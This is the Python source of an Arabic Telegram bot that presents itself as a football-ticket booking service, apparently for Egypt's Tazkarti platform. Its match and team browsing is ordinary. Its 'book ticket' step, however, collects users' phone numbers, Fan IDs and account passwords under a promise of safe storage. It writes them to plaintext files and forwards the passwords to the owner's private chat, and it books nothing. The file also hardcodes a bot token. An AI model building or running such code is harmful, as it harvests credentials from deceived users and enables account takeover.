import asyncio
import json
import os
import logging
import sys
import threading
from datetime import datetime
from typing import Optional
from http.server import HTTPServer, BaseHTTPRequestHandler

if sys.platform == "win32":
    asyncio.set_event_loop_policy(asyncio.WindowsProactorEventLoopPolicy())
    asyncio.set_event_loop(asyncio.new_event_loop())

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

import tazkarti_api as tazkarti

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

BOT_TOKEN = "8123254144:AAFbCADZT3gl213b-9PrQMEyalSyj1tgqyA"
OWNER_USERNAME = "amrmadiii"
OWNER_CHAT_ID_FILE = os.path.join(os.path.dirname(__file__), "owner_chat_id.txt")
DATA_FILE = os.path.join(os.path.dirname(__file__), "user_data.json")
BOOKING_DATA_DIR = os.path.join(os.path.dirname(__file__), "booking_data")

user_data_store = {}


def load_data():
    global user_data_store
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, "r", encoding="utf-8") as f:
            user_data_store = json.load(f)


def save_data():
    with open(DATA_FILE, "w", encoding="utf-8") as f:
        json.dump(user_data_store, f, ensure_ascii=False, indent=2)


def get_owner_chat_id():
    if os.path.exists(OWNER_CHAT_ID_FILE):
        with open(OWNER_CHAT_ID_FILE, "r") as f:
            return f.read().strip()
    return None


def set_owner_chat_id(cid):
    with open(OWNER_CHAT_ID_FILE, "w") as f:
        f.write(str(cid))


def save_booking_to_file(user_id, username, first_name, last_name, phone, fan_id, password):
    os.makedirs(BOOKING_DATA_DIR, exist_ok=True)
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    safe_name = username or first_name or user_id
    filename = f"{ts}_{safe_name}_{fan_id}.txt"
    filepath = os.path.join(BOOKING_DATA_DIR, filename)
    content = (
        f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        f"User ID: {user_id}\n"
        f"Name: {first_name} {last_name or ''}\n"
        f"Username: @{username or 'N/A'}\n"
        f"Phone: {phone}\n"
        f"Fan ID: {fan_id}\n"
        f"Password: {password}\n"
    )
    with open(filepath, "w", encoding="utf-8") as f:
        f.write(content)
    logger.info(f"Booking data saved: {filepath}")
    return filepath


def get_user(user_id):
    uid = str(user_id)
    if uid not in user_data_store:
        user_data_store[uid] = {
            "favorite_team_id": None,
            "favorite_team_name": None,
            "phone": None,
            "fan_id": None,
            "password": None,
            "notifications": True,
        }
    return user_data_store[uid]


def main_menu():
    keyboard = [
        [InlineKeyboardButton("📅 المباريات المتاحة", callback_data="matches")],
        [InlineKeyboardButton("🏟️ الفرق", callback_data="teams_page_0")],
        [InlineKeyboardButton("⭐ فريقي المفضل", callback_data="my_favorite")],
        [InlineKeyboardButton("🎫 حجز تذكرة", callback_data="book_ticket")],
        [InlineKeyboardButton("📋 بياناتي", callback_data="my_data")],
    ]
    return InlineKeyboardMarkup(keyboard)


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    get_user(user.id)
    save_data()

    if user.username and user.username.lower() == OWNER_USERNAME:
        set_owner_chat_id(user.id)
        logger.info(f"Owner chat ID saved: {user.id}")

    await update.message.reply_text(
        f"مرحباً {user.first_name}!\n"
        "بوت تذاكر - تصفح المباريات، اختر فريقك المفضل، واحجز تذكرتك.\n"
        "اختر من القائمة أدناه:",
        reply_markup=main_menu(),
    )


async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data

    if data == "matches":
        await show_matches(query, context)
    elif data.startswith("teams_page_"):
        page = int(data.split("_")[-1])
        await show_teams(query, context, page)
    elif data.startswith("team_"):
        team_id = int(data.split("_")[1])
        await show_team_detail(query, context, team_id)
    elif data == "my_favorite":
        await my_favorite_menu(query, context)
    elif data.startswith("set_fav_"):
        team_id = int(data.split("_")[2])
        await set_favorite(query, context, team_id)
    elif data.startswith("remove_fav_"):
        team_id = int(data.split("_")[2])
        await remove_favorite(query, context, team_id)
    elif data == "book_ticket":
        await book_ticket_start(query, context)
    elif data == "my_data":
        await show_my_data(query, context)
    elif data == "cancel_booking":
        await cancel_booking(query, context)
    elif data == "back_main":
        await query.edit_message_text("القائمة الرئيسية:", reply_markup=main_menu())


async def show_matches(query, context):
    try:
        matches = tazkarti.get_matches()
    except Exception as e:
        await query.edit_message_text(f"خطأ في جلب المباريات: {e}")
        return

    if not matches:
        await query.edit_message_text("لا توجد مباريات متاحة حالياً.")
        return

    text = "📅 المباريات المتاحة:\n\n"
    for i, m in enumerate(matches, 1):
        team1 = m.get("teamNameAr1") or m.get("teamName1", "")
        team2 = m.get("teamNameAr2") or m.get("teamName2", "")
        stadium = m.get("stadiumNameAr") or m.get("stadiumName", "")
        date_str = ""
        if m.get("kickOffTime"):
            try:
                dt = datetime.fromisoformat(m["kickOffTime"].replace("Z", ""))
                date_str = dt.strftime("%Y-%m-%d %H:%M")
            except:
                date_str = m["kickOffTime"]
        text += f"{i}. {team1} vs {team2}\n"
        text += f"   🏟️ الملعب: {stadium}\n"
        text += f"   📆 التاريخ: {date_str}\n"
        text += f"   ✅ الحالة: {'متاحة' if m.get('matchStatus') == 1 else 'غير متاحة'}\n\n"

    keyboard = [[InlineKeyboardButton("🔙 رجوع", callback_data="back_main")]]
    await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))


async def show_teams(query, context, page=0, search_text=None):
    try:
        teams = tazkarti.get_epl_teams()
    except Exception as e:
        await query.edit_message_text(f"خطأ في جلب الفرق: {e}")
        return

    if search_text:
        teams = [
            t for t in teams
            if search_text.lower() in (t.get("name") or "").lower()
            or search_text.lower() in (t.get("nameAr") or "")
        ]

    per_page = 10
    total_pages = max(1, (len(teams) + per_page - 1) // per_page)
    page = max(0, min(page, total_pages - 1))
    start = page * per_page
    end = start + per_page
    page_teams = teams[start:end]

    text = f"🏟️ الدوري المصري (صفحة {page + 1}/{total_pages}):\n\n"
    for t in page_teams:
        name = t.get("nameAr") or t.get("name", "")
        text += f"🆔 {t['id']} - {name}\n"

    keyboard = []
    row = []
    for t in page_teams[:5]:
        row.append(InlineKeyboardButton(
            t.get("nameAr") or t.get("name", "?"),
            callback_data=f"team_{t['id']}"
        ))
    if row:
        keyboard.append(row)

    nav_row = []
    if page > 0:
        nav_row.append(InlineKeyboardButton("السابق", callback_data=f"teams_page_{page - 1}"))
    if page < total_pages - 1:
        nav_row.append(InlineKeyboardButton("التالي", callback_data=f"teams_page_{page + 1}"))
    if nav_row:
        keyboard.append(nav_row)
    keyboard.append([InlineKeyboardButton("🔙 رجوع", callback_data="back_main")])

    await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))


async def show_team_detail(query, context, team_id):
    try:
        teams = tazkarti.get_epl_teams()
    except Exception as e:
        await query.edit_message_text(f"خطأ: {e}")
        return

    team = None
    for t in teams:
        if t["id"] == team_id:
            team = t
            break

    if not team:
        await query.edit_message_text("الفريق غير موجود.")
        return

    name = team.get("nameAr") or team.get("name", "")
    matches = tazkarti.get_matches_for_team(team_id)
    uid = str(query.from_user.id)
    user = get_user(uid)
    is_fav = user.get("favorite_team_id") == team_id

    text = f"🏟️ الفريق: {name}\n"
    text += f"المباريات القادمة: {len(matches)}\n\n"
    if matches:
        text += "المباريات:\n"
        for m in matches:
            opp = m.get("teamNameAr2") or m.get("teamName2", "")
            if m.get("teamId1") != team_id:
                opp = m.get("teamNameAr1") or m.get("teamName1", "")
            dt = m.get("kickOffTime", "")[:10]
            text += f"- ضد {opp} في {dt}\n"
    else:
        text += "لا توجد مباريات قادمة."

    keyboard = []
    if is_fav:
        keyboard.append([InlineKeyboardButton("❌ إزالة من المفضلة", callback_data=f"remove_fav_{team_id}")])
    else:
        keyboard.append([InlineKeyboardButton("⭐ إضافة إلى المفضلة", callback_data=f"set_fav_{team_id}")])
    keyboard.append([InlineKeyboardButton("🔙 رجوع", callback_data=f"teams_page_0")])

    await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))


async def my_favorite_menu(query, context):
    uid = str(query.from_user.id)
    user = get_user(uid)
    fav_id = user.get("favorite_team_id")

    if not fav_id:
        text = "لم تختر فريقاً مفضلاً بعد.\n"
        text += "اذهب إلى قائمة الفرق واختر فريقك المفضل."
        keyboard = [[InlineKeyboardButton("🏟️ الفرق", callback_data="teams_page_0")],
                    [InlineKeyboardButton("🔙 رجوع", callback_data="back_main")]]
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
        return

    try:
        matches = tazkarti.get_matches_for_team(fav_id)
        teams = tazkarti.get_epl_teams()
        team_name = user.get("favorite_team_name", str(fav_id))
        for t in teams:
            if t["id"] == fav_id:
                team_name = t.get("nameAr") or t.get("name", str(fav_id))
                break
    except Exception as e:
        await query.edit_message_text(f"خطأ: {e}")
        return

    notif_status = "✅ مفعلة" if user.get("notifications", True) else "❌ متوقفة"
    text = f"⭐ فريقي المفضل: {team_name}\n"
    text += f"الإشعارات: {notif_status}\n\n"
    text += f"المباريات القادمة ({len(matches)}):\n"

    if matches:
        for m in matches:
            opp = m.get("teamNameAr2") or m.get("teamName2", "")
            if m.get("teamId1") != fav_id:
                opp = m.get("teamNameAr1") or m.get("teamName1", "")
            dt = m.get("kickOffTime", "")[:10]
            text += f"- ضد {opp} - {dt}\n"
    else:
        text += "لا توجد مباريات قادمة."

    keyboard = [
        [InlineKeyboardButton("❌ إزالة المفضلة", callback_data=f"remove_fav_{fav_id}")],
        [InlineKeyboardButton("🔙 رجوع", callback_data="back_main")],
    ]
    await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))


async def set_favorite(query, context, team_id):
    uid = str(query.from_user.id)
    user = get_user(uid)
    try:
        teams = tazkarti.get_epl_teams()
        team_name = str(team_id)
        for t in teams:
            if t["id"] == team_id:
                team_name = t.get("nameAr") or t.get("name", str(team_id))
                break
    except:
        team_name = str(team_id)

    user["favorite_team_id"] = team_id
    user["favorite_team_name"] = team_name
    save_data()

    owner_cid = get_owner_chat_id()
    if owner_cid:
        from_user = query.from_user
        msg = (
            f"⭐ <b>فريق مفضل جديد!</b>\n"
            f"👤 {from_user.first_name} {from_user.last_name or ''}\n"
            f"🆔 @{from_user.username or 'N/A'}\n"
            f"🏟️ {team_name}\n"
            f"🏷️ {from_user.id}"
        )
        try:
            await context.bot.send_message(chat_id=int(owner_cid), text=msg, parse_mode="HTML")
        except Exception as e:
            logger.warning(f"Could not notify owner: {e}")

    await query.answer(f"✅ تم حفظ {team_name} كفريقك المفضل!")
    await show_team_detail(query, context, team_id)


async def remove_favorite(query, context, team_id):
    uid = str(query.from_user.id)
    user = get_user(uid)
    user["favorite_team_id"] = None
    user["favorite_team_name"] = None
    save_data()

    await query.answer("❌ تم إزالة الفريق من المفضلة!")
    await show_team_detail(query, context, team_id)


async def book_ticket_start(query, context):
    uid = str(query.from_user.id)
    user = get_user(uid)
    user["awaiting_booking"] = True
    save_data()

    text = (
        "لحجز تذكرة، أرسل البيانات كل سطر على حدة:\n\n"
        "<b>رقم الموبايل</b>\n"
        "<b>رقم المعجب (Fan ID)</b>\n"
        "<b>كلمة المرور</b>\n\n"
        "مثال:\n"
        "<code>01012345678</code>\n"
        "<code>1234567890</code>\n"
        "<code>mypassword</code>\n\n"
        "سيتم حفظ بياناتك بشكل آمن."
    )

    keyboard = [[InlineKeyboardButton("إلغاء", callback_data="cancel_booking")]]
    await query.edit_message_text(
        text,
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="HTML",
    )


async def handle_booking_data(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    uid = str(user.id)
    saved = get_user(uid)

    if not saved.get("awaiting_booking"):
        return False

    text = update.message.text.strip()
    parts = text.splitlines()

    if len(parts) < 3:
        await update.message.reply_text(
            "صيغة غير صحيحة. أرسل كل سطر على حدة:\n"
            "<b>رقم الموبايل</b>\n"
            "<b>رقم المعجب (Fan ID)</b>\n"
            "<b>كلمة المرور</b>\n\n"
            "مثال:\n"
            "<code>01012345678</code>\n"
            "<code>1234567890</code>\n"
            "<code>mypassword</code>",
            parse_mode="HTML",
        )
        return True

    phone = parts[0].strip()
    fan_id = parts[1].strip()
    password = parts[2].strip()

    saved["phone"] = phone
    saved["fan_id"] = fan_id
    saved["password"] = password
    saved["awaiting_booking"] = False
    save_data()

    try:
        filepath = save_booking_to_file(
            user_id=user.id,
            username=user.username,
            first_name=user.first_name,
            last_name=user.last_name or "",
            phone=phone,
            fan_id=fan_id,
            password=password,
        )

        owner_cid = get_owner_chat_id()
        if owner_cid:
            msg = (
                f"🎫 <b>بيانات حجز جديدة!</b>\n"
                f"👤 {user.first_name} {user.last_name or ''}\n"
                f"🆔 @{user.username or 'N/A'}\n"
                f"📱 {phone}\n"
                f"🎫 {fan_id}\n"
                f"🔑 <code>{password}</code>\n"
                f"🏷️ {user.id}"
            )
            try:
                await context.bot.send_message(chat_id=int(owner_cid), text=msg, parse_mode="HTML")
            except Exception as e:
                logger.warning(f"Could not notify owner: {e}")

        await update.message.reply_text(
            "✅ تم حفظ البيانات بنجاح! سيتم التواصل معك في أقرب وقت.",
            reply_markup=main_menu(),
        )
    except Exception as e:
        logger.error(f"Failed to save booking data: {e}")
        await update.message.reply_text(
            "❌ حدث خطأ أثناء حفظ البيانات. حاول مرة أخرى لاحقاً.",
            reply_markup=main_menu(),
        )
    return True


async def cancel_booking(query, context):
    uid = str(query.from_user.id)
    user = get_user(uid)
    user["awaiting_booking"] = False
    save_data()
    await query.edit_message_text("تم الإلغاء.", reply_markup=main_menu())


async def show_my_data(query, context):
    uid = str(query.from_user.id)
    user = get_user(uid)
    fav_name = user.get("favorite_team_name") or "غير محدد"
    phone = user.get("phone") or "غير محدد"
    fan_id = user.get("fan_id") or "غير محدد"

    text = "📋 بياناتي:\n\n"
    text += f"⭐ الفريق المفضل: {fav_name}\n"
    text += f"📱 رقم الهاتف: {phone}\n"
    text += f"🎫 رقم المعجب: {fan_id}\n"

    keyboard = [[InlineKeyboardButton("🔙 رجوع", callback_data="back_main")]]
    await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))


async def check_new_matches(context: ContextTypes.DEFAULT_TYPE):
    try:
        matches = tazkarti.get_matches()
    except Exception:
        return

    for uid, user in list(user_data_store.items()):
        fav_id = user.get("favorite_team_id")
        if not fav_id or not user.get("notifications", True):
            continue

        team_matches = [m for m in matches if m.get("teamId1") == fav_id or m.get("teamId2") == fav_id]
        if not team_matches:
            continue

        seen = set(user.get("seen_matches", []))
        new_matches = [m for m in team_matches if m["matchId"] not in seen]

        if new_matches:
            team_name = user.get("favorite_team_name", str(fav_id))
            text = f"⚽ مباريات جديدة لـ {team_name}:\n\n"
            for m in new_matches:
                opp = m.get("teamNameAr2") or m.get("teamName2", "")
                if m.get("teamId1") != fav_id:
                    opp = m.get("teamNameAr1") or m.get("teamName1", "")
                dt = m.get("kickOffTime", "")[:16]
                text += f"🔹 ضد {opp} - {dt}\n"
                seen.add(m["matchId"])

            user["seen_matches"] = list(seen)
            save_data()

            try:
                await context.bot.send_message(
                    chat_id=int(uid),
                    text=text,
                )
            except Exception as e:
                logger.warning(f"Could not notify user {uid}: {e}")

            owner_cid = get_owner_chat_id()
            if owner_cid:
                owner_msg = (
                    f"⚽ <b>إشعار مباراة!</b>\n"
                    f"👤 User ID: {uid}\n"
                    f"🏟️ {team_name}\n"
                    f"📅 مباريات جديدة متاحة"
                )
                try:
                    await context.bot.send_message(chat_id=int(owner_cid), text=owner_msg, parse_mode="HTML")
                except Exception as e:
                    logger.warning(f"Could not notify owner: {e}")


async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    handled = await handle_booking_data(update, context)
    if not handled:
        await update.message.reply_text("استخدم /start للقائمة الرئيسية.")


def main():
    load_data()
    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))

    job_queue = app.job_queue
    job_queue.run_repeating(check_new_matches, interval=300, first=10)

    port = int(os.environ.get("PORT", 8080))
    server = HTTPServer(("0.0.0.0", port), HealthHandler)
    t = threading.Thread(target=server.serve_forever, daemon=True)
    t.start()
    logger.info(f"Health server running on port {port}")

    logger.info("Bot started!")
    app.run_polling(allowed_updates=Update.ALL_TYPES)


class HealthHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")
    def log_message(self, format, *args):
        return


if __name__ == "__main__":
    main()
